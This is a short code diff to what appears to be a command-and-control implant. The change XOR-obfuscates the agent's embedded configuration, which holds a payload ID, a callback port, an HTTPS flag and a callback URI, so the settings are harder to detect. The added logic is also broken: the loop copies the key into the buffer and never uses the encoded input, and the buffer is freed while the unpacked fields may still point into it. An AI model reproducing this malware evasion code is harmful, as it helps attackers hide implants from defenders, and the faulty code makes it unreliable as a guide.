@@ -91,8 +91,13 @@ char *unpack_str(char *buf, int *offset) {
  *
 */
 
-void unpack_params(char *raw_params, AgentParams *params) {
-	// Takes the packed strings patched in by the linker and unpacks it into an AgentParams struct.
+void unpack_params(char *enc_params, char *key, AgentParams *params) {
+	// Takes the packed strings patched in by the linker, deobfuscates them, and unpacks it into an AgentParams struct.
+	char *raw_params = KERNEL32$VirtualAlloc(0, PARAM_BUFFER_LEN, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+	for (int i = 0; i < PARAM_BUFFER_LEN; i++) {
+		raw_params[i] = key[i % XORKEY_LEN];
+	}
+	
 	int offset = 0;
 	
 	params->payload_uuid = unpack_str(raw_params, &offset);
@@ -100,6 +105,8 @@ void unpack_params(char *raw_params, AgentParams *params) {
 	params->callback_port = unpack_int(raw_params, &offset);
 	params->callback_https = unpack_int(raw_params, &offset);
 	params->callback_uri = unpack_str(raw_params, &offset);
+	
+	KERNEL32$VirtualFree(raw_params, 0, MEM_RELEASE);
 }
 
 void free_params(AgentParams *params) {
